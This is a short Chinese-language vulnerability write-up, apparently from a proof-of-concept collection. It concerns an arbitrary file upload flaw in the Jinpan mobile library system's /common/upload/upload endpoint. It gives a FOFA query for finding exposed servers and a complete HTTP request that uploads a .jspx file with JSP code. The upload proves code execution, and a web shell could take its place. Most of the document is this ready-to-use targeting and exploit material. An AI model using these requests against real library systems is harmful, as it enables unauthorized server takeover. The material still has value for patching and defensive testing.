# 金盘移动图书馆系统upload存在任意文件上传漏洞

金盘图书馆微信管理平台 /common/upload/upload 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取权限。

## fofa

```javascript
app="金盘软件-金盘移动图书馆系统"
```

## poc

```javascript
POST /common/upload/upload HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=399e563f0389566bd40fd4d6409a67dd
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cookie: JSESSIONID=D8C7BD39FAF4DD095FBBB0E87FB017C5
Connection: close
Content-Length: 179

--399e563f0389566bd40fd4d6409a67dd
Content-Disposition: form-data; name="file"; filename="aaaaaa.jspx"

<% out.println("Do You Want?"); %>
--399e563f0389566bd40fd4d6409a67dd--
```

![image-20250217100804857](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502171008957.png)